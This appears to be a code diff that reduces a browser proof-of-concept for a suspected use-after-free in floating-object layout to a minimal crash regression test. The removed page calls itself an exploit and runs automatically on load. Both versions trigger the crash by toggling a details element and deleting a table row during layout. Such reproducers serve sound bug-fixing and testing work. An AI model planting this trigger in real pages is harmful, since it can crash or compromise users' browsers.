@@ -1,106 +1,38 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Possible UAF in FloatingObjects PoC</title>
-    <style>
-        :not(marker) {
-            background: url(#svgvar00007) repeat-x scroll top left;
-            zoom: 50%;
-        }
-        details {
-            font: 1pt monospace;
-        }
-    </style>
-</head>
-<body>
-    <p id="status">Initializing...</p>
-    <div id="console"></div>
-    <script>
-function logDebug(message) {
-    let timestamp = new Date().toISOString();
-    let debugMsg = `[${timestamp}] ${message}\n`;
-    console.log(debugMsg);
-    let consoleDiv = document.getElementById("console");
-    consoleDiv.innerHTML += debugMsg;
-    consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll
+<style>
+:not(marker) {
+  background: url(#svgvar00007) repeat-x scroll top left;
+  zoom: 50%;
 }
+details {
+  font: 1pt monospace;
+}
+</style>
+
+<script>
+window.testRunner?.dumpAsText();
 
 function testRun() {
-    logDebug("Step 1: Running initial test...");
-    let button = document.getElementById("buttonID");
-    button.outerHTML = "undefined"; // Modify DOM
-    logDebug("Step 2: Button outerHTML modified.");
+  buttonID.outerHTML = "undefined";
 }
 
 function eventhandler3() {
-    logDebug("Step 3: Event handler triggered (ontoggle)...");
-    let details = document.getElementById("detailsID");
-    details.open = false; // Close details
-    logDebug("Step 4: Details closed.");
-
-    logDebug("Step 5: Accessing document.body.offsetHeight...");
-    document.body.offsetHeight; // Force layout
-
-    let table = document.getElementById("tableID");
-    logDebug("Step 6: Attempting to delete row from table...");
-    table.deleteRow(1); // Delete row, potential UAF
-    logDebug("Step 7: Row deleted.");
-
-    // Attempt to access deleted object (UAF test)
-    try {
-        logDebug("Step 8: Testing access to deleted row...");
-        let row = table.rows[1]; // Should be undefined or cause crash
-        logDebug(`Step 9: Row access result: ${row ? "Exists" : "Undefined"}`);
-    } catch (e) {
-        logDebug(`Step 9: UAF detected: ${e.message}`);
-    }
+  detailsID.open = false;
+  
+  document.body.offsetHeight;
+  tableID.deleteRow(1);
 }
+</script>
 
-function pwn() {
-    logDebug("Starting PoC for possible UAF in FloatingObjects...");
-
-    try {
-        // Set up the DOM
-        logDebug("Step 0: Setting up DOM...");
-        document.body.innerHTML = `
-            <button id="buttonID">
-                <details id="detailsID" ontoggle="eventhandler3()" open="true">
-                    <summary>
-                        <table id="tableID" align="right">
-                            <tr><td>Row 1</td></tr>
-                            <tr><td>Row 2</td></tr>
-                            <tfoot><th>Footer</th></tfoot>
-                            <th>PASS if no crash or assert</th>
-                        </table>
-                        <iframe srcdoc="">content</iframe>
-                    </summary>
-                    <span><li><embed><ol></ol></embed></li></span>
-                </details>
-            </button>
-        `;
-
-        logDebug("Step 10: Running testRun...");
-        testRun(); // Initial DOM modification
-        let details = document.getElementById("detailsID");
-        details.open = true; // Trigger ontoggle
-        logDebug("Step 11: Triggered ontoggle to start eventhandler3.");
-
-    } catch (e) {
-        logDebug(`Step 12: Error during execution: ${e.message}`);
-        document.getElementById("status").innerHTML = "Exploit failed!";
-        document.getElementById("console").innerHTML += "Possible UAF crash.\n";
-        location.reload(); // Reload on failure
-        return;
-    }
-
-    logDebug("Step 13: PoC completed - check for UAF or crash.");
-    document.getElementById("status").innerHTML = "Success - Test Completed!";
-}
-
-// تنفيذ الاستغلال تلقائيًا عند التحميل
-pwn();
-    </script>
-</body>
-</html>
+<body onload=testRun()>
+<button id=buttonID>
+<details id=detailsID ontoggle="eventhandler3()" open="true">
+<summary>
+<table id=tableID align="right">
+<tr></tr>
+<tfoot><th></th></tfoot>
+<th>PASS if no crash or assert</th>
+</table>
+<iframe srcdoc="">content</iframe>
+</summary>
+<span>
+<li><embed><ol>
